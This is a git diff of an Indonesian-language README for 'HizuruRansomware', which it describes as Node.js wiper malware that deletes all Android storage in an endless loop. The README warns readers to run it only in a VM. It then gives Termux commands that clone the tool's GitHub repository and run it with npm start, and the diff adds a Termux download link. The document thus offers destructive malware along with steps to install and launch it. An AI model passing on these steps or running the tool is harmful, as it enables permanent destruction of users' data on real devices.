@@ -3,10 +3,10 @@
 # HizuruRansomware
 ***Penjelasan***
 > HizuruRansomware adalah Program CLI yang ditulis menggunakan Node.js, Program ini dapat dikategorikan Sebagai Wiper Malware karena Sifatnya yang Menghancurkan dan tidak dapat memulihkan Data Android Kembali. Diharapkan jangan pernah menjalankan Program ini secara Coba-Coba karena bersifat Fatal Jika kamu menjalankannya bukan di lingkungan VM
-
+---
 **DANGER!!**
 > Jangan Pernah Untuk mencoba-coba menjalankan Program ini Tanpa menjalankannya di lingkungan VM, Malware ini diRancang untuk menghapus semua Data Penyimpanan kita secara Looping tanpa Henti yang Dapat mengakibatkan Data Hilang Permanen! Disarankan Backup Data terlebih Dahulu bila ingin mencoba di Lingkungan non-VM
-
+---
 # Cara Installasi (Termux Only)
 ***Masukkan Semua Command ini kedalam Termux Anda***
 ```bash
@@ -22,8 +22,9 @@ git clone https://github.com/SyifaaDev/HizuruWiper.git
 cd HizuruWiper
 npm start
 ```
+***Download Termux***
+https://f-droid.org/repo/com.termux_1002.apk
 ---
-
 <div align="center">
   <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" alt="JS" />
   <img src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="NodeJS" />
